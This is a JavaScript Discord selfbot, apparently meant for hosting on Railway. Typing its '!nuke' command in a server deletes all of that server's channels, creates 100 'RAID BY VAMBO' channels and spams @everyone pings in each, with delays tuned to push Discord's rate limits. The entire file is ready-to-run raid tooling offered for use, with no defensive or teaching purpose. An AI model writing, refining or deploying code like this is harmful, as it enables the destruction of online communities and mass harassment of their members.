const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Nuke selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !nuke in any channel to destroy the server`);
});

client.on('messageCreate', async (message) => {
    // Only respond to your own messages
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== FASTER NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        
        if (!guild) return;

        console.log(`💣 Starting FAST NUKE on ${guild.name}`);

        // ===== STEP 1: DELETE ALL CHANNELS (FASTER) =====
        let deletedCount = 0;
        
        // Get all channels
        const channels = [...guild.channels.cache.values()];
        
        // Delete all channels with minimal delay
        for (const channel of channels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted: ${channel.name}`);
                // Minimal delay to avoid hitting rate limits too hard
                await new Promise(resolve => setTimeout(resolve, 300));
            } catch (error) {
                console.log(`❌ Failed to delete ${channel.name}: ${error.message}`);
            }
        }
        
        console.log(`✅ Deleted ${deletedCount} channels`);

        // ===== STEP 2: CREATE 100 RAID CHANNELS (FASTER) =====
        console.log(`🔥 Creating 100 raid channels FAST...`);
        
        // Channel name with Zalgo text
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        
        // Raid message with pings
        const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        let createdCount = 0;

        // Create 100 channels with minimal delay
        for (let i = 1; i <= 100; i++) {
            try {
                // Create channel
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                
                // Send raid message immediately
                await newChannel.send(raidMessage);
                
                createdCount++;
                console.log(`✅ Created channel ${i}/100`);
                
                // Minimal delay - Discord's limit is about 1 per second, so 500ms is aggressive
                await new Promise(resolve => setTimeout(resolve, 500));
                
            } catch (error) {
                console.log(`❌ Failed to create channel ${i}: ${error.message}`);
                
                // If rate limited, wait a bit then continue
                if (error.message.includes('rate')) {
                    console.log('⏳ Rate limited, waiting 2 seconds...');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
        }

        // ===== FINAL LOG ONLY (NO CHANNEL CREATED) =====
        console.log('='.repeat(50));
        console.log('💀 **NUKE COMPLETE** 💀');
        console.log(`✅ Deleted: ${deletedCount} channels`);
        console.log(`✅ Created: ${createdCount} raid channels`);
        console.log('='.repeat(50));
    }
});

client.login(TOKEN);
